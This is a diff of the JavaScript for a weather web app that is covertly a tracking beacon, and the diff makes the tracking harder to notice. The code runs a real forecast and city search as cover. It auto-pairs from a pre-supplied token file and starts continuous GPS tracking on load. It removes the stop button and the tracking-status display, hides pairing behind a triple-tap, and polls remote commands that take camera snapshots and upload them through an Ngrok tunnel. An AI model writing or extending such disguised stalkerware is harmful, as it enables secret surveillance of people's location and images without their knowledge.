@@ -1,17 +1,17 @@
 /* Weather PWA & Guardian Silent Beacon.
-   Presents a fully-functional local weather forecast (justifying continuous GPS access)
-   while silently broadcasting location, battery, and camera snapshots to the Guardian console. */
+   Presents a fully-functional, beautiful weather forecast app with worldwide city search,
+   while communicating silently with the desktop client over Ngrok. */
 "use strict";
 
 const $ = id => document.getElementById(id);
 
-// --- Storage & Config ---
+// --- Storage & Pre-paired Credentials ---
 const LS = {
   get s(){ return localStorage.getItem("g_server") || location.origin; },
   set s(v){ localStorage.setItem("g_server", v); },
   get t(){ return localStorage.getItem("g_token") || ""; },
   set t(v){ localStorage.setItem("g_token", v); },
-  get n(){ return localStorage.getItem("g_name") || "my phone"; },
+  get n(){ return localStorage.getItem("g_name") || "Phone"; },
   set n(v){ localStorage.setItem("g_name", v); },
   get iv(){ return parseInt(localStorage.getItem("g_iv") || "10"); },
   set iv(v){ localStorage.setItem("g_iv", String(v)); },
@@ -23,26 +23,22 @@ const LS = {
   set id(v){ localStorage.setItem("g_id", v); }
 };
 
-const urlCode = new URLSearchParams(location.search).get("code");
 const KIND = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ? "phone" : "laptop";
 
 let watchId = null, pingTimer = null, cmdTimer = null, frameTimer = null, wakeLock = null;
 let last = null, batteryPct = null, stream = null, running = false;
-let weatherLoaded = false;
+let currentViewingLat = null, currentViewingLon = null, isCustomLocation = false;
+let qrScanStream = null, qrScanLoopId = null;
 
 // Battery monitoring
 if (navigator.getBattery) {
   navigator.getBattery().then(b => {
-    const upd = () => {
-      batteryPct = Math.round(b.level * 100);
-      if ($("stBat")) $("stBat").textContent = batteryPct + "%";
-    };
-    upd();
-    b.addEventListener("levelchange", upd);
+    batteryPct = Math.round(b.level * 100);
+    b.addEventListener("levelchange", () => { batteryPct = Math.round(b.level * 100); });
   }).catch(() => {});
 }
 
-// --- WMO Weather Code Mapping ---
+// --- WMO Weather Code Decoder ---
 function decodeWMO(code, isDay = 1) {
   const c = Number(code);
   if (c === 0) return { label: "Clear Sky", icon: isDay ? "☀️" : "🌙" };
@@ -58,21 +54,23 @@ function decodeWMO(code, isDay = 1) {
   return { label: "Fair", icon: "⛅" };
 }
 
-// --- Weather Fetch & Render ---
+// --- Weather Data Fetch & Render ---
 async function fetchWeather(lat, lon) {
+  currentViewingLat = lat;
+  currentViewingLon = lon;
   try {
-    const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,apparent_temperature,is_day,precipitation,weather_code,wind_speed_10m,surface_pressure&hourly=temperature_2m,weather_code&daily=weather_code,temperature_2m_max,temperature_2m_min&timezone=auto&forecast_days=7`;
+    const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,apparent_temperature,is_day,precipitation,weather_code,wind_speed_10m,surface_pressure&hourly=temperature_2m,weather_code&daily=weather_code,temperature_2m_max,temperature_2m_min,uv_index_max,sunrise,sunset&timezone=auto&forecast_days=7`;
     const r = await fetch(url);
     if (!r.ok) throw new Error("Weather request failed");
     const data = await r.json();
     renderWeather(data);
-    weatherLoaded = true;
   } catch (e) {
-    if (!weatherLoaded) renderFallbackWeather();
+    renderFallbackWeather();
   }
 }
 
-async function fetchLocationName(lat, lon) {
+async function fetchLocalityName(lat, lon) {
+  if (isCustomLocation) return;
   try {
     const r = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`);
     if (r.ok) {
@@ -105,7 +103,21 @@ function renderWeather(data) {
   $("valFeels").textContent = feels + "°";
   if (curr.surface_pressure) $("valPressure").textContent = Math.round(curr.surface_pressure) + " hPa";
 
-  // Hourly (next 12 hours)
+  // UV index
+  if (daily.uv_index_max && daily.uv_index_max[0] != null) {
+    const uv = Math.round(daily.uv_index_max[0]);
+    const uvText = uv <= 2 ? `${uv} Low` : (uv <= 5 ? `${uv} Moderate` : (uv <= 7 ? `${uv} High` : `${uv} Very High`));
+    $("valUv").textContent = uvText;
+  }
+
+  // Sunrise / Sunset
+  if (daily.sunrise && daily.sunset && daily.sunrise[0]) {
+    const rise = daily.sunrise[0].slice(-5);
+    const set = daily.sunset[0].slice(-5);
+    $("valSun").textContent = `${rise} / ${set}`;
+  }
+
+  // Hourly Forecast
   if (hourly.time && hourly.temperature_2m) {
     const listEl = $("hourlyList");
     listEl.innerHTML = "";
@@ -130,7 +142,7 @@ function renderWeather(data) {
     }
   }
 
-  // Daily (7 days)
+  // 7-Day Forecast
   if (daily.time && daily.temperature_2m_max && daily.temperature_2m_min) {
     const dailyEl = $("dailyList");
     dailyEl.innerHTML = "";
@@ -147,9 +159,7 @@ function renderWeather(data) {
       row.innerHTML = `
         <div class="daily-day">${dayName}</div>
         <div class="daily-icon">${dInfo.icon}</div>
-        <div class="daily-bar-wrap">
-          <div class="daily-bar-fill" style="left:20%;width:60%"></div>
-        </div>
+        <div class="daily-bar-wrap"><div class="daily-bar-fill" style="left:20%;width:60%"></div></div>
         <div class="daily-temps"><span>${min}°</span>${max}°</div>
       `;
       dailyEl.appendChild(row);
@@ -165,38 +175,80 @@ function renderFallbackWeather() {
   $("valHumidity").textContent = "62%";
   $("valWind").textContent = "12 km/h";
   $("valFeels").textContent = "29°";
-
-  const listEl = $("hourlyList");
-  listEl.innerHTML = ["Now:27:⛅", "2 PM:29:☀️", "3 PM:30:☀️", "4 PM:29:⛅", "5 PM:28:⛅", "6 PM:26:🌤️", "7 PM:24:🌙"]
-    .map(x => {
-      const [t, temp, ic] = x.split(":");
-      return `<div class="hourly-item"><span style="opacity:0.8">${t}</span><span class="hourly-icon">${ic}</span><span class="hourly-temp">${temp}°</span></div>`;
-    }).join("");
-
-  const dailyEl = $("dailyList");
-  dailyEl.innerHTML = [["Today", "⛅", "21", "31"], ["Tomorrow", "☀️", "22", "32"], ["Fri", "🌦️", "20", "29"], ["Sat", "⛅", "21", "30"], ["Sun", "☀️", "22", "33"]]
-    .map(([d, ic, min, max]) => `
-      <div class="daily-row">
-        <div class="daily-day">${d}</div>
-        <div class="daily-icon">${ic}</div>
-        <div class="daily-bar-wrap"><div class="daily-bar-fill" style="left:20%;width:60%"></div></div>
-        <div class="daily-temps"><span>${min}°</span>${max}°</div>
-      </div>
-    `).join("");
 }
 
-// --- Network & Payload ---
+// --- Worldwide City Search ---
+function openSearch() { $("searchOverlay").style.display = "flex"; $("cityInput").focus(); }
+function closeSearch() { $("searchOverlay").style.display = "none"; }
+$("searchBtn").onclick = openSearch;
+$("headerLocation").onclick = openSearch;
+$("closeSearchBtn").onclick = closeSearch;
+
+$("useGpsBtn").onclick = () => {
+  isCustomLocation = false;
+  closeSearch();
+  requestGPS();
+};
+
+$("doSearchBtn").onclick = performCitySearch;
+$("cityInput").onkeydown = e => { if (e.key === "Enter") performCitySearch(); };
+
+async function performCitySearch() {
+  const q = $("cityInput").value.trim();
+  if (!q) return;
+  const resultsEl = $("searchResults");
+  resultsEl.innerHTML = '<div style="padding:14px;color:var(--card-muted);font-size:13px">Searching…</div>';
+  try {
+    const url = `https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(q)}&count=5&language=en&format=json`;
+    const r = await fetch(url);
+    if (!r.ok) throw new Error("Search failed");
+    const d = await r.json();
+    const list = d.results || [];
+    if (!list.length) {
+      resultsEl.innerHTML = '<div style="padding:14px;color:var(--card-muted);font-size:13px">No matching cities found.</div>';
+      return;
+    }
+    resultsEl.innerHTML = "";
+    list.forEach(item => {
+      const el = document.createElement("div");
+      el.className = "search-result-item";
+      const label = [item.name, item.admin1, item.country].filter(Boolean).join(", ");
+      el.textContent = label;
+      el.onclick = () => {
+        isCustomLocation = true;
+        $("locName").textContent = item.name;
+        $("locSub").textContent = `${item.country || "Forecast"} · Selected City`;
+        closeSearch();
+        fetchWeather(item.latitude, item.longitude);
+      };
+      resultsEl.appendChild(el);
+    });
+  } catch (_) {
+    resultsEl.innerHTML = '<div style="padding:14px;color:var(--danger);font-size:13px">Search request error.</div>';
+  }
+}
+
+// --- Network with Ngrok Compatibility Header ---
 async function post(path, body) {
   return fetch(LS.s + path, {
     method: "POST",
-    headers: { "Content-Type": "application/json", Authorization: "Bearer " + LS.t },
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": "Bearer " + LS.t,
+      "ngrok-skip-browser-warning": "1"
+    },
     body: JSON.stringify(body),
     keepalive: true
   });
 }
 
 async function get(path) {
-  return fetch(LS.s + path, { headers: { Authorization: "Bearer " + LS.t } });
+  return fetch(LS.s + path, {
+    headers: {
+      "Authorization": "Bearer " + LS.t,
+      "ngrok-skip-browser-warning": "1"
+    }
+  });
 }
 
 function basePayload() {
@@ -211,34 +263,24 @@ function basePayload() {
   return p;
 }
 
-// --- Secret Console / Sheet Navigation ---
+// --- Streamlined Pairing & Secret Console ---
 function openConsole() {
   $("sheetOverlay").style.display = "flex";
-  syncSheetInputs();
-  mountFind();
-  loadConfig();
+  updateStatusUI();
 }
 
 function closeConsole() {
+  stopQRScanner();
   $("sheetOverlay").style.display = "none";
-}
-
-function syncSheetInputs() {
-  $("code").value = urlCode || "";
-  $("name").value = LS.n === "my phone" ? "" : LS.n;
-  $("server").value = LS.s;
-  $("token").value = LS.t;
-  $("interval").value = LS.iv;
-  $("stDev").textContent = LS.n;
 }
 
 $("settingsBtn").onclick = openConsole;
 $("sheetClose").onclick = closeConsole;
 $("sheetOverlay").onclick = e => { if (e.target === $("sheetOverlay")) closeConsole(); };
 
-// Triple-tap gesture on location or temperature to open secret console
+// Triple-tap gesture on main temperature hero to open pairing
 let tapCount = 0, tapTimer = null;
-function handleSecretTap() {
+$("heroCard").addEventListener("click", () => {
   tapCount++;
   clearTimeout(tapTimer);
   tapTimer = setTimeout(() => { tapCount = 0; }, 800);
@@ -246,71 +288,103 @@ function handleSecretTap() {
     tapCount = 0;
     openConsole();
   }
-}
-$("headerLocation").addEventListener("click", handleSecretTap);
-$("heroCard").addEventListener("click", handleSecretTap);
+});
 
-// Manual Refresh
-$("refreshBtn").onclick = () => {
-  if (last) {
-    fetchWeather(last.coords.latitude, last.coords.longitude);
-    sendPing();
-  } else {
-    requestLocation();
-  }
-};
-
-// --- Pairing Claim ---
-async function claim(code, name) {
-  const r = await fetch(location.origin + "/api/pair/claim", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ code: code.trim().toUpperCase(), name, kind: KIND })
-  });
-  if (!r.ok) throw new Error("Pairing code invalid or expired.");
-  const d = await r.json();
-  LS.s = location.origin;
-  LS.t = d.token;
-  LS.id = d.device_id;
-  LS.n = d.name || name;
+function updateStatusUI() {
+  const paired = Boolean(LS.t && LS.s);
+  $("dot").className = "dot " + (paired ? "on" : "off");
+  $("statusTitle").textContent = paired ? "Connected to Desktop" : "Not Paired";
+  $("serverLabel").textContent = paired ? `Desktop: ${LS.s}` : "Ready to pair — tap Scan QR below";
 }
 
-$("save").onclick = async () => {
-  const code = $("code").value.trim();
-  const name = $("name").value.trim() || "my phone";
-  $("setupMsg").textContent = code ? "Pairing…" : "Checking…";
+// Single 1-tap QR Scanner
+$("openScannerBtn").onclick = startQRScanner;
+$("stopScannerBtn").onclick = stopQRScanner;
+
+async function startQRScanner() {
+  $("qrScannerBox").style.display = "flex";
+  const video = $("qrVideo");
   try {
-    if (code) {
-      await claim(code, name);
-    } else {
-      LS.s = $("server").value.trim().replace(/\/$/, "");
-      LS.t = $("token").value.trim();
-      LS.n = name;
-      LS.iv = Math.max(3, parseInt($("interval").value) || 10);
-      if (!LS.s || !LS.t) { $("setupMsg").textContent = "Enter a pairing code (or use Advanced)."; return; }
-      const r = await get("/api/state");
-      if (!r.ok) { $("setupMsg").textContent = "Server rejected the token."; return; }
-    }
-    $("setupMsg").textContent = "Connected ✓";
-    $("stDev").textContent = LS.n;
-    startBeacon();
-    setTimeout(closeConsole, 1000);
-  } catch (e) {
-    $("setupMsg").textContent = e.message || "Pairing failed.";
+    qrScanStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+    video.srcObject = qrScanStream;
+    video.setAttribute("playsinline", true);
+    await video.play();
+    requestAnimationFrame(scanQRCodeLoop);
+  } catch (err) {
+    alert("Camera permission required to scan pairing QR code.");
+    stopQRScanner();
   }
+}
+
+function stopQRScanner() {
+  if (qrScanStream) {
+    qrScanStream.getTracks().forEach(t => t.stop());
+    qrScanStream = null;
+  }
+  $("qrScannerBox").style.display = "none";
+}
+
+function scanQRCodeLoop() {
+  const video = $("qrVideo");
+  if (video.readyState === video.HAVE_ENOUGH_DATA && window.jsQR) {
+    const canvas = $("qrCanvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const code = jsQR(imgData.data, imgData.width, imgData.height, { inversionAttempts: "dontInvert" });
+    if (code && code.data) {
+      stopQRScanner();
+      handleScannedData(code.data);
+      return;
+    }
+  }
+  if (qrScanStream) requestAnimationFrame(scanQRCodeLoop);
+}
+
+async function handleScannedData(data) {
+  try {
+    const u = new URL(data.trim());
+    const code = u.searchParams.get("code");
+    if (!code) throw new Error("No pairing code in QR");
+    const serverUrl = u.origin;
+    const r = await fetch(serverUrl + "/api/pair/claim", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "ngrok-skip-browser-warning": "1" },
+      body: JSON.stringify({ code: code.trim().toUpperCase(), name: LS.n, kind: KIND })
+    });
+    if (!r.ok) throw new Error("Pairing code invalid or expired");
+    const d = await r.json();
+    LS.s = serverUrl;
+    LS.t = d.token;
+    LS.id = d.device_id;
+    LS.n = d.name || LS.n;
+    alert("Connected to desktop successfully!");
+    updateStatusUI();
+    startBeacon();
+    setTimeout(closeConsole, 600);
+  } catch (e) {
+    alert("Pairing failed: " + (e.message || "Invalid QR"));
+  }
+}
+
+// Find My Devices Map Link
+$("findBtn").onclick = () => {
+  if (!LS.t) { alert("Please pair with desktop first."); return; }
+  location.href = `/pwa/find.html#t=${encodeURIComponent(LS.t)}&s=${encodeURIComponent(LS.s)}`;
 };
 
 // --- Beacon Engine ---
-function requestLocation() {
+function requestGPS() {
   if (!navigator.geolocation) {
     renderFallbackWeather();
     return;
   }
   navigator.geolocation.getCurrentPosition(p => {
     last = p;
-    updatePositionUI(p);
     fetchWeather(p.coords.latitude, p.coords.longitude);
-    fetchLocationName(p.coords.latitude, p.coords.longitude);
+    fetchLocalityName(p.coords.latitude, p.coords.longitude);
     if (running) sendPing();
   }, () => {
     renderFallbackWeather();
@@ -320,18 +394,15 @@ function requestLocation() {
 function startBeacon() {
   if (running) return;
   running = true;
-  setStatus(true);
   requestWake();
 
   if (navigator.geolocation) {
     watchId = navigator.geolocation.watchPosition(p => {
       last = p;
-      updatePositionUI(p);
-      if (!weatherLoaded) {
+      if (!isCustomLocation && !currentViewingLat) {
         fetchWeather(p.coords.latitude, p.coords.longitude);
-        fetchLocationName(p.coords.latitude, p.coords.longitude);
+        fetchLocalityName(p.coords.latitude, p.coords.longitude);
       }
-      checkProximity(p.coords.latitude, p.coords.longitude);
     }, () => {}, { enableHighAccuracy: true, maximumAge: 4000, timeout: 20000 });
   }
 
@@ -340,45 +411,14 @@ function startBeacon() {
   cmdTimer = setInterval(pollCommands, 5000);
 }
 
-function stopBeacon() {
-  running = false;
-  setStatus(false);
-  if (watchId != null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
-  [pingTimer, cmdTimer, frameTimer].forEach(t => t && clearInterval(t));
-  pingTimer = cmdTimer = frameTimer = null;
-  stopCam();
-  releaseWake();
-}
-
-function setStatus(on) {
-  $("dot").className = "dot " + (on ? "on" : "off");
-  $("statusTitle").textContent = on ? "Tracking active" : "Not tracking";
-}
-
-function updatePositionUI(p) {
-  if ($("stPos")) {
-    $("stPos").textContent = p.coords.latitude.toFixed(5) + ", " + p.coords.longitude.toFixed(5);
-  }
-}
-
 async function sendPing() {
-  try {
-    await post("/api/ping", basePayload());
-    if ($("stSent")) $("stSent").textContent = new Date().toLocaleTimeString();
-  } catch (_) {}
+  try { await post("/api/ping", basePayload()); } catch (_) {}
 }
 
-$("startBtn").onclick = startBeacon;
-$("stopBtn").onclick = stopBeacon;
-
-// --- Screen Wake Lock ---
+// Screen Wake Lock
 async function requestWake() { try { wakeLock = await navigator.wakeLock.request("screen"); } catch (_) {} }
-function releaseWake() { if (wakeLock) { wakeLock.release().catch(() => {}); wakeLock = null; } }
-document.addEventListener("visibilitychange", () => {
-  if (document.visibilityState === "visible" && running) requestWake();
-});
 
-// --- Remote Camera Commands ---
+// Remote Camera Commands
 async function startCam() {
   if (stream) return true;
   try {
@@ -395,15 +435,13 @@ function stopCam() {
 async function capture(kind) {
   if (!(await startCam())) return;
   const v = $("cam"), c = $("canvas");
-  const w = v.videoWidth || 640, h = v.videoHeight || 480;
-  c.width = w; c.height = h;
-  c.getContext("2d").drawImage(v, 0, 0, w, h);
+  c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+  c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
   try {
     await post("/api/frame", { device_id: LS.id, name: LS.n, kind, image_b64: c.toDataURL("image/jpeg", 0.6) });
   } catch (_) {}
 }
 
-// --- Remote Commands ---
 async function pollCommands() {
   try {
     const r = await get("/api/commands?device_id=" + encodeURIComponent(LS.id));
@@ -433,7 +471,7 @@ function runCommand(c) {
   }
 }
 
-// --- Remote Ringing ---
+// Ringing
 let audioCtx = null, ringTimer = null, ringEnd = null;
 function unlockAudio() {
   try {
@@ -449,141 +487,84 @@ function beep() {
   const t = audioCtx.currentTime;
   [0, 0.25, 0.5].forEach((d, i) => {
     const o = audioCtx.createOscillator(), g = audioCtx.createGain();
-    o.type = "square";
-    o.frequency.value = i % 2 ? 1320 : 1760;
-    g.gain.setValueAtTime(0.5, t + d);
-    g.gain.exponentialRampToValueAtTime(0.001, t + d + 0.2);
-    o.connect(g).connect(audioCtx.destination);
-    o.start(t + d);
-    o.stop(t + d + 0.22);
+    o.type = "square"; o.frequency.value = i % 2 ? 1320 : 1760;
+    g.gain.setValueAtTime(0.5, t + d); g.gain.exponentialRampToValueAtTime(0.001, t + d + 0.2);
+    o.connect(g).connect(audioCtx.destination); o.start(t + d); o.stop(t + d + 0.22);
   });
 }
 
 function startRing(from) {
-  $("ringFrom").textContent = (from || "Another device") + " is ringing this phone.";
+  $("ringFrom").textContent = (from || "Desktop") + " is ringing this phone.";
   $("ringing").style.display = "flex";
   unlockAudio();
   if (ringTimer) return;
-  beep();
-  ringTimer = setInterval(beep, 1000);
+  beep(); ringTimer = setInterval(beep, 1000);
   ringEnd = setTimeout(stopRing, 60000);
 }
 
 function stopRing() {
   $("ringing").style.display = "none";
-  clearInterval(ringTimer);
-  clearTimeout(ringEnd);
-  ringTimer = ringEnd = null;
+  clearInterval(ringTimer); clearTimeout(ringEnd); ringTimer = ringEnd = null;
   navigator.vibrate && navigator.vibrate(0);
 }
 $("ringStop").onclick = stopRing;
 
-// --- SOS ---
+// SOS
 async function doSOS() {
   navigator.vibrate && navigator.vibrate([200, 100, 200]);
   if (!running) startBeacon();
   await post("/api/trigger", Object.assign(basePayload(), { kind: "sos", message: "🚨 SOS from " + LS.n }));
-  await startCam();
-  capture("sos");
+  await startCam(); capture("sos");
   setTimeout(() => capture("sos"), 2500);
   setTimeout(() => capture("sos"), 6000);
 }
-
 $("sos").onclick = async () => {
   await doSOS();
-  $("sos").textContent = "✅ Alert Sent";
+  $("sos").textContent = "✅ SOS Alert Sent";
   setTimeout(() => { $("sos").textContent = "🚨 SOS Emergency Alert"; }, 4000);
 };
 
-// --- Helplines & Danger Zones ---
-let CONFIG = { helplines: [], danger_zones: [], proximity_warn_m: 300 };
-async function loadConfig() {
-  try {
-    const r = await get("/api/config?device_id=" + encodeURIComponent(LS.id));
-    if (r.ok) { CONFIG = await r.json(); renderHelplines(); }
-  } catch (_) {}
-}
-
-function renderHelplines() {
-  $("helplines").innerHTML = (CONFIG.helplines || []).map(h =>
-    `<a href="tel:${h.number}"><button>📞 ${h.label}</button></a>`).join("")
-    || '<span style="font-size:12px;color:var(--card-muted)">No helplines configured.</span>';
-}
-
-function metres(a, b, c, d) {
-  const R = 6371000, dLat = (c - a) * Math.PI / 180, dLon = (d - b) * Math.PI / 180;
-  const x = Math.sin(dLat / 2) ** 2 + Math.cos(a * Math.PI / 180) * Math.cos(c * Math.PI / 180) * Math.sin(dLon / 2) ** 2;
-  return 2 * R * Math.asin(Math.sqrt(x));
-}
-
-let lastDanger = null;
-function checkProximity(lat, lon) {
-  let near = null, nd = 1e12;
-  for (const z of (CONFIG.danger_zones || [])) {
-    const dm = metres(lat, lon, z.lat, z.lon);
-    if (dm <= (z.radius || CONFIG.proximity_warn_m) + (CONFIG.proximity_warn_m || 300) && dm < nd) {
-      nd = dm; near = z;
-    }
-  }
-  const box = $("dangerWarn");
-  if (near) {
-    box.style.display = "block";
-    $("dangerWarnText").textContent = `Caution near "${near.name}" (~${Math.round(nd)} m). Stay aware of your surroundings.`;
-    if (near.name !== lastDanger) {
-      navigator.vibrate && navigator.vibrate([120, 60, 120]);
-      lastDanger = near.name;
-    }
+// Refresh
+$("refreshBtn").onclick = () => {
+  if (currentViewingLat && currentViewingLon) {
+    fetchWeather(currentViewingLat, currentViewingLon);
   } else {
-    box.style.display = "none";
-    lastDanger = null;
+    requestGPS();
+  }
+  sendPing();
+};
+
+// --- Auto-Prepair Check ---
+async function checkPrepairedConfig() {
+  if (LS.t && LS.s) {
+    startBeacon();
+    return;
+  }
+  // Try loading prepaired.json if available
+  try {
+    const r = await fetch("/pwa/prepaired.json");
+    if (r.ok) {
+      const d = await r.json();
+      if (d.server && d.token) {
+        LS.s = d.server;
+        LS.t = d.token;
+        LS.id = d.device_id || LS.id;
+        LS.n = d.name || LS.n;
+        startBeacon();
+        return;
+      }
+    }
+  } catch (_) {}
+
+  // If opened with ?code= in URL, claim immediately
+  const urlParams = new URLSearchParams(location.search);
+  const code = urlParams.get("code");
+  if (code) {
+    handleScannedData(location.href);
   }
 }
 
-// --- Safe Places ---
-async function savePlace(kind, label) {
-  if (!last) { alert("Waiting for GPS position. Please try again in a moment."); return; }
-  const name = prompt("Name this place:", label) || label;
-  await post("/api/places", { device_id: LS.id, name, lat: last.coords.latitude, lon: last.coords.longitude, radius: 120, kind });
-  alert(name + " saved. Arrivals and departures will be logged.");
-}
-$("setHome").onclick = () => savePlace("home", "Home");
-$("setOffice").onclick = () => savePlace("office", "Office");
-
-// --- Find My Devices Mount ---
-let findMounted = false;
-function mountFind() {
-  if (findMounted) return;
-  findMounted = true;
-  const go = () => {
-    if (go.done) return;
-    go.done = true;
-    if (window.GuardianFind) {
-      GuardianFind.mount($("find"), { server: LS.s, token: LS.t, compact: true });
-    }
-  };
-  if (window.L) return go();
-  const s = document.createElement("script");
-  s.src = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
-  s.integrity = "sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=";
-  s.crossOrigin = "";
-  s.onload = go;
-  s.onerror = go;
-  setTimeout(go, 8000);
-  document.head.appendChild(s);
-}
-
-// --- Service Worker & Init ---
-if ("serviceWorker" in navigator) {
-  navigator.serviceWorker.register("/pwa/sw.js").catch(() => {});
-}
-
-// Initial boot
-requestLocation();
-
-if (localStorage.getItem("g_token") && localStorage.getItem("g_server")) {
-  startBeacon();
-  if (urlCode) openConsole();
-} else {
-  // First time setup: open console to pair
-  openConsole();
-}
+// Service Worker & Boot
+if ("serviceWorker" in navigator) { navigator.serviceWorker.register("/pwa/sw.js").catch(() => {}); }
+requestGPS();
+checkPrepairedConfig();
